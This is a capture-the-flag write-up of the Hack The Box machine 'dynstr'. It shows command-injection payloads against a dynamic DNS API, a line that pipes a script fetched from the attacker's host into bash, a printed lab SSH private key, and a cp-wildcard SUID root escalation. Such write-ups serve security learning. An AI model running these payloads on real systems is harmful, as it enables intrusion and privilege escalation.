# [dynstr](https://app.hackthebox.eu/machines/dynstr)

> A Linux box hosting an in-beta dynamic DNS service powered by an API that is vulnerable to operating system command injection. With command execution, it is possible to navigate the file system and read an SSH private key. However, only machines with an IP address mapped to a hostname in the `infra.dyna.htb` zone are able to log into the machine using the SSH private key. Leverage the command injection vulnerability to add a `PTR` record that allows the attacker to log into the machine using the SSH private key. With SSH access, the user is capable of running a script with elevated privileges that is capable of being exploited to write a SUID binary owned by `root`.

#dynamic-dns #no-ip-api #command-injection #dns-zones #ssh-keys #authorized-keys-from #cp-wildcard-to-preserve-suid

---

## Open Port Discovery

### TCP

```bash
$ masscan -p1-65535 10.10.10.244 --rate=1000 -e tun0 --output-format grepable --output-filename dynstr.masscan
$ cat dynstr.masscan  | grep open | cut -d' ' -f5 | cut -d'/' -f1 | sort -u | tr '\n' ','
22,53,80
```

TCP ports 22 (SSH), 53 (DNS), and 80 (HTTP) are open.

### UDP

```bash
$ nmap -sU 10.10.10.244
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-23 16:40 UTC
Nmap scan report for ip-10-10-10-244.us-east-2.compute.internal (10.10.10.244)
Host is up (0.018s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
53/udp open  domain

Nmap done: 1 IP address (1 host up) scanned in 1087.72 seconds
```

UDP port 53 (DNS) is open.

---

## Open Port Enumeration

```bash
$ nmap -sC -sV -O -p22,53,80 10.10.10.244 -oA dynstr
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-23 16:42 UTC
Nmap scan report for ip-10-10-10-244.us-east-2.compute.internal (10.10.10.244)
Host is up (0.018s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 05:7c:5e:b1:83:f9:4f:ae:2f:08:e1:33:ff:f5:83:9e (RSA)
|   256 3f:73:b4:95:72:ca:5e:33:f6:8a:8f:46:cf:43:35:b9 (ECDSA)
|_  256 cc:0a:41:b7:a1:9a:43:da:1b:68:f5:2a:f8:2a:75:2c (ED25519)
53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Dyna DNS
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.26 seconds
```

OpenSSH string indicates the target is Ubuntu 20.04.

Apache web server on port 80 may indicate a PHP backend.

---

## DNS Enumeration

TCP port 53 is running the BIND DNS server version 9.16.1.

This version is [vulnerable to a buffer overflow](https://www.zerodayinitiative.com/blog/2021/2/24/cve-2020-8625-a-fifteen-year-old-rce-bug-returns-in-isc-bind-server), though no exploit was publicly available.

Attempting a zone transfer is unsuccessful.

```bash
$ fierce --domain dyna.htb --dns-servers 10.10.10.244
NS: dns1.dyna.htb.
SOA: dns1.dyna.htb. (127.0.0.1)
Zone: failure
Wildcard: failure
Found: dns1.dyna.htb. (127.0.0.1)
Nearby:
{'127.0.0.1': 'localhost.'}
```

---

## Web Application Enumeration

The web application is for the organization Dyna DNS, who offers a dynamic DNS solution.

![](images/Pasted%20image%2020210923165602.png)

The purpose of dynamic DNS is to keep DNS records up-to-date even when an IP address changes. 

A typical use case: you want a server in your internal network to be accessible via the Internet. Your router leverages NAT and your ISP constantly changes your router's external IP address. You can leverage dynamic DNS to associate your router's IP address to a hostname and then the dynamic DNS provider will do the leg work of making sure that your router's external IP address is always associated with that particular hostname, even when your ISP changes the router's external IP address.

The web page specifies that Dyna DNS offers the same dynamic DNS API as [no-ip.com](https://www.noip.com/integrate/request).

It also mentions that they provide dynamic DNS for the following three domains:
1. `dnsalias.htb`
2. `dynamicdns.htb`
3. `no-ip.htb`

This means that Dyna DNS will only map IP addresses to subdomains of these domains.

The web page also mentions that Dyna DNS is still running in beta mode and thus can be accessed using the shared credentials `dynadns:sndanyd`.

The bottom of web page has link to `dyna.htb`. Add this to the DNS resolver.

### Content Discovery

```bash
$ gobuster dir -u http://dyna.htb -w /usr/share/wordlists/Seclists/Discovery/Web-Content/raft-small-words.txt -x php
/assets               (Status: 301) [Size: 305] [--> http://dyna.htb/assets/]
/.                    (Status: 200) [Size: 10909]
/nic                  (Status: 301) [Size: 302] [--> http://dyna.htb/nic/]
```

`/nic` is a part of the `no-ip.com` API and `/assets/` returns a 403 Forbidden.

### Virtual Host Discovery

```bash
$ gobuster vhost -u http://dyna.htb -w /usr/share/wordlists/subdomains-top1million-5000.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://dyna.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/wordlists/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2021/09/23 17:18:16 Starting gobuster in VHOST enumeration mode
===============================================================
                              
===============================================================
2021/09/23 17:18:26 Finished
===============================================================
```

Nothing.

---

## Dynamic DNS API

It is possible to interact with Dyna DNS's dynamic DNS API. The HTTP basic auth credentials are `dynadns:sndanyd`, the URL is `http://dyna.htb/nic/update`, and the query parameters are `hostname`, the DNS hostname, and `myip`, the IP address to map the hostname to. Note the response from the server when the `hostname` is malformed.

```bash
$ curl 'http://dynadns:sndanyd@dyna.htb/nic/update?hostname=.dnsalias.htb&myip=10.10.14.130'
911 [nsupdate failed]
```

Is it possible that this application is taking the input and passing it to the `nsupdate` program on the command line? Looking at `nsupdate`'s [man page](https://linux.die.net/man/8/nsupdate), it appears that the program is generally executed interactively. This means that it is unlikely to be vulnerable to command injection. However, according to [this gist](https://gist.github.com/mbrownnycnyc/5644413), it is possible to execute `nsupdate` non-interactively by piping a multi-ine string of the commands into it, like so:

```bash
$ echo "server 10.10.14.244
update add $hostname 3600 IN A $myip
send" | nsupdate
```

If this is the case, it may be possible to break out of the command with the following `hostname`:

```txt
"$(id);.dnsalias.htb
```

The request:

```http
GET /nic/update?hostname="$(id);.dnsalias.htb HTTP/1.1
Host: dyna.htb
Authorization: Basic ZHluYWRuczpzbmRhbnlk
User-Agent: curl/7.74.0
Accept: */*
Connection: close
```

The response indicates that the command is properly executed and output is returned.

```http
HTTP/1.1 200 OK
Date: Thu, 23 Sep 2021 21:42:03 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 121
Connection: close
Content-Type: text/html; charset=UTF-8

server 127.0.0.1
zone dnsalias.htb
update delete uid=33(www-data) gid=33(www-data) groups=33(www-data)
good 10.10.14.130
```

Execution is under the `www-data` user.

---

## Code Execution to User

Users:

```bash
$ ls -la /home
total 16
drwxr-xr-x 4 root root 4096 Mar 15 2021 .
drwxr-xr-x 18 root root 4096 May 25 14:52 ..
drwxr-xr-x 5 bindmgr bindmgr 4096 Mar 15 2021 bindmgr
drwxr-xr-x 3 dyna dyna 4096 Mar 18 2021 dyna
```

`bindmgr`'s home directory:

```bash
$ ls -la /home/bindmgr
total 36
drwxr-xr-x 5 bindmgr bindmgr 4096 Mar 15 2021 .
drwxr-xr-x 4 root root 4096 Mar 15 2021 ..
lrwxrwxrwx 1 bindmgr bindmgr 9 Mar 15 2021 .bash_history -> /dev/null
-rw-r--r-- 1 bindmgr bindmgr 220 Feb 25 2020 .bash_logout
-rw-r--r-- 1 bindmgr bindmgr 3771 Feb 25 2020 .bashrc
drwx------ 2 bindmgr bindmgr 4096 Mar 13 2021 .cache
-rw-r--r-- 1 bindmgr bindmgr 807 Feb 25 2020 .profile
drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 2021 .ssh
drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 2021 support-case-C62796521
-r-------- 1 bindmgr bindmgr 33 Sep 23 06:47 user.txt
```

`/home/bindmgr/support-case-C62796521` directory:

```bash
$ ls -la /home/bindmgr/support-case-C62796521
total 436 drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 2021 .
drwxr-xr-x 5 bindmgr bindmgr 4096 Mar 15 2021 ..
-rw-r--r-- 1 bindmgr bindmgr 237141 Mar 13 2021 C62796521-debugging.script
-rw-r--r-- 1 bindmgr bindmgr 29312 Mar 13 2021 C62796521-debugging.timing
-rw-r--r-- 1 bindmgr bindmgr 1175 Mar 13 2021 command-output-C62796521.txt
-rw-r--r-- 1 bindmgr bindmgr 163048 Mar 13 2021 strace-C62796521.txt
```

`/home/bindmgr/support-case-C62796521/command-output-C62796521.txt` contents:

```bash
$ cat /home/bindmgr/support-case-C62796521/command-output-C62796521.txt
Expire in 0 ms for 6 (transfer 0x56090d2d1fb0) index.html update
Expire in 1 ms for 1 (transfer 0x56090d2d1fb0) index.html update
Expire in 0 ms for 1 (transfer 0x56090d2d1fb0) index.html update
Expire in 2 ms for 1 (transfer 0x56090d2d1fb0) index.html update
Expire in 0 ms for 1 (transfer 0x56090d2d1fb0) index.html update
Expire in 0 ms for 1 (transfer 0x56090d2d1fb0) index.html update
Expire in 2 ms for 1 (transfer 0x56090d2d1fb0) index.html update
Expire in 0 ms for 1 (transfer 0x56090d2d1fb0) index.html update
Expire in 1 ms for 1 (transfer 0x56090d2d1fb0) index.html update
Expire in 2 ms for 1 (transfer 0x56090d2d1fb0) index.html update
Expire in 1 ms for 1 (transfer 0x56090d2d1fb0) index.html update
Expire in 1 ms for 1 (transfer 0x56090d2d1fb0) index.html update
Expire in 2 ms for 1 (transfer 0x56090d2d1fb0) index.html update
Trying 192.168.178.27... index.html update
TCP_NODELAY set index.html update
Expire in 200 ms for 4 (transfer 0x56090d2d1fb0) index.html update
Connected to sftp.infra.dyna.htb (192.168.178.27) port 22 (#0) index.html update SSH MD5 fingerprint: c1c2d07855aa0f80005de88d254a6db8 index.html update
SSH authentication methods available: publickey,password index.html update
Using SSH public key file '/home/bindmgr/.ssh/id_rsa.pub' index.html update
Using SSH private key file '/home/bindmgr/.ssh/id_rsa' index.html update
SSH public key authentication failed: Callback returned error index.html update Failure connecting to agent index.html update
Authentication failure index.html update
Closing connection 0
```

It appears that this script is attempting to transfer files to or from `sftp.infra.dyna.htb` (IP 192.168.178.27) over port 22 with public key cryptography. Is it possible to set `sftp.infra.dyna.htb` to our IP address and intercept the public and private keys? Seems complicated. Keep looking.

`/home/bindmgr/support-case-C62796521/C62796521-debugging.script` and ` /home/bindmgr/support-case-C62796521/strace-C62796521.txt` appear to be attempting to download the file `sftp://bindmgr@sftp.infra.dyna.htb/bindmgr-release.zip` and contain the same SSH private key:

```bash
$ cat /home/bindmgr/support-case-C62796521/C62796521-debugging.script
...[SNIP]...
execve("/usr/bin/curl", ["curl", "-v", "-sk", "sftp://bindmgr@sftp.infra.dyna.htb/bindmgr-release.zip", "--pubkey", "/home/bindmgr/.ssh/id_rsa.pub"]
...[SNIP]...
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1
42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3
HjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F
L6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn
UOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX
CUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz
uSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a
XQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P
ZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk
+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs
4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq
xTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD
PswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k
obFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l
u291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS
TbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A
Tyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE
BNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv
C79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX
Wv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt
U96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ
b6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5
rlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG
jGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
...[SNIP]...
```

Attempts to use this key to login as `bindmgr`, `dyna`, and `root` all failed. Nothing in `/etc/ssh/ssh_config` indicates why. Check the machine's authorized SSH keys. It is necessary to base64 encode and then decode the file path `/home/bindmgr/.ssh/authorized_keys` because the `/update` endpoint is splitting the `hostname` on `.` characters.

```http
GET /nic/update?hostname="$(p=$(echo+L2hvbWUvYmluZG1nci8uc3NoL2F1dGhvcml6ZWRfa2V5cwo=+|+base64+-d);cat+$p);.dnsalias.htb HTTP/1.1
Host: dyna.htb
Authorization: Basic ZHluYWRuczpzbmRhbnlk
User-Agent: curl/7.74.0
Accept: */*
Connection: close
```

```txt
from="*.infra.dyna.htb" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF4pkc7L5EaGz6CcwSCx1BqzuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7aXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38PZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WOD bindmgr@nomen
```

It appears that the machine only allows clients with the domain name `*.infra.dyna.htb` to SSH into it using the discovered private key. Update both the A record and the PTR record associating the attacking machine's IP address with a hostname that matches the pattern.

On the attacker machine, create a text file that builds the `nsupdate` commands in a file on the target machine and pipes the contents of that file into `/nsupdate`. Since the desired hostname must be in the `infra.dyna.htb` domain, use the `/etc/bind/infra.key` key for `nsupdate` authentication. Serve this file on the attacking machine's port 80.

```bash
$ cat nsupdate
echo "server 127.0.0.1" > /dev/shm/tgihf.txt
echo "update delete tgihf.infra.dyna.htb A" >> /dev/shm/tgihf.txt
echo "update add tgihf.infra.dyna.htb 3600 A 10.10.14.130"  >> /dev/shm/tgihf.txt
echo "" >> /dev/shm/tgihf.txt
echo "update delete 130.14.10.10.in-addr.arpa PTR" >> /dev/shm/tgihf.txt
echo "update add 130.14.10.10.in-addr.arpa 3600 PTR tgihf.infra.dyna.htb" >> /dev/shm/tgihf.txt
echo send >> /dev/shm/tgihf.txt
cat /dev/shm/tgihf.txt | /usr/bin/nsupdate -t 1 -k /etc/bind/infra.key
$ python3 -m http.server 80
```

Send the request to download the file from the attacker and pipe it into `/bin/bash`:

```http
GET /nic/update?hostname="$(ip=$(echo+MTAuMTAuMTQuMTMw+|+base64+-d);curl+http://$ip/nsupdate+|+/bin/bash+2>%261);.dnsalias.htb HTTP/1.1
Host: dyna.htb
Authorization: Basic ZHluYWRuczpzbmRhbnlk
User-Agent: curl/7.74.0
Accept: */*
Connection: close
```

SSH into the target as `bindmgr`:

```bash
$ ssh -i bindmgr-id-ssh bindmgr@dyna.htb
Last login: Fri Sep 24 04:57:09 2021 from tgihf.infra.dyna.htb
bindmgr@dynstr:~$ id
uid=1001(bindmgr) gid=1001(bindmgr) groups=1001(bindmgr)
```

---

## Privilege Escalation

### Enumeration

```bash
$ sudo -l
sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
Matching Defaults entries for bindmgr on dynstr:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bindmgr may run the following commands on dynstr:
    (ALL) NOPASSWD: /usr/local/bin/bindmgr.sh
```

`bindmgr` is capable of running `/usr/local/bin/bindmgr.sh` with elevated privileges. The script:

```bash
$ cat /usr/local/bin/bindmgr.sh
#!/usr/bin/bash

# This script generates named.conf.bindmgr to workaround the problem
# that bind/named can only include single files but no directories.
#
# It creates a named.conf.bindmgr file in /etc/bind that can be included
# from named.conf.local (or others) and will include all files from the
# directory /etc/bin/named.bindmgr.
#
# NOTE: The script is work in progress. For now bind is not including
#       named.conf.bindmgr. 
#
# TODO: Currently the script is only adding files to the directory but
#       not deleting them. As we generate the list of files to be included
#       from the source directory they won't be included anyway.

BINDMGR_CONF=/etc/bind/named.conf.bindmgr
BINDMGR_DIR=/etc/bind/named.bindmgr

indent() { sed 's/^/    /'; }

# Check versioning (.version)
echo "[+] Running $0 to stage new configuration from $PWD."
if [[ ! -f .version ]] ; then
    echo "[-] ERROR: Check versioning. Exiting."
    exit 42
fi
if [[ "`cat .version 2>/dev/null`" -le "`cat $BINDMGR_DIR/.version 2>/dev/null`" ]] ; then
    echo "[-] ERROR: Check versioning. Exiting."
    exit 43
fi

# Create config file that includes all files from named.bindmgr.
echo "[+] Creating $BINDMGR_CONF file."
printf '// Automatically generated file. Do not modify manually.\n' > $BINDMGR_CONF
for file in * ; do
    printf 'include "/etc/bind/named.bindmgr/%s";\n' "$file" >> $BINDMGR_CONF
done

# Stage new version of configuration files.
echo "[+] Staging files to $BINDMGR_DIR."
cp .version * /etc/bind/named.bindmgr/

# Check generated configuration with named-checkconf.
echo "[+] Checking staged configuration."
named-checkconf $BINDMGR_CONF >/dev/null
if [[ $? -ne 0 ]] ; then
    echo "[-] ERROR: The generated configuration is not valid. Please fix following errors: "
    named-checkconf $BINDMGR_CONF 2>&1 | indent
    exit 44
else 
    echo "[+] Configuration successfully staged."
    # *** TODO *** Uncomment restart once we are live.
    # systemctl restart bind9
    if [[ $? -ne 0 ]] ; then
        echo "[-] Restart of bind9 via systemctl failed. Please check logfile: "
        systemctl status bind9
    else
        echo "[+] Restart of bind9 via systemctl succeeded."
    fi
fi
```

### Exploitation

Notice how the script copies the `.version` file and all other files in the current directory to `/etc/bind/named.bindmgr/`:

```bash
...[SNIP]...
cp .version * /etc/bind/named.bindmgr/
...[SNIP]...
```

By creating a malicious binary in the current directory and making it SUID and then running `/usr/local/bin/bindmgr.sh`, the malicious binary will be copied to `/etc/bind/named.bindmgr/` and owned by `root`, but it will lose its SUID capability.

Due to the way `bash`'s wildcard operator works, it is possible to pass arbitrary flags into `cp`. If there exists a file in the current directory named `--preserve=mode`, then this flag will get passed into `cp` which will ensure that the malicious binary does not lose its SUID capability.

Create a file in the current directory named `.version` containing the number 2.

```bash
$ echo 2 > .version
```

Create the malicious binary and make it SUID.

```bash
$ cp /bin/bash tgihf
$ chmod 4777 tgihf
```

Create the file `--preserve=mode` in the current directory.

```bash
$ echo "" > "--preserve=mode"
```

Run the script with `sudo`.

```bash
$ sudo /usr/local/bin/bindmgr.sh
sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
[+] Running /usr/local/bin/bindmgr.sh to stage new configuration from /dev/shm/tgihf.
[+] Creating /etc/bind/named.conf.bindmgr file.
[+] Staging files to /etc/bind/named.bindmgr.
[+] Checking staged configuration.
[-] ERROR: The generated configuration is not valid. Please fix following errors: 
    /etc/bind/named.conf.bindmgr:2: open: /etc/bind/named.bindmgr/--preserve=mode: file not found
```

The files should have been copied to `/etc/bind/named.bindmgr/` and the malicious binary should be SUID and owned by `root`. Execute it and note the effective user ID.

```bash
$ /etc/bind/named/bindmgr/tgihf -p
$ id
uid=1001(bindmgr) gid=1001(bindmgr) euid=0(root) groups=1001(bindmgr)
```

Collect the system flag to complete the box.
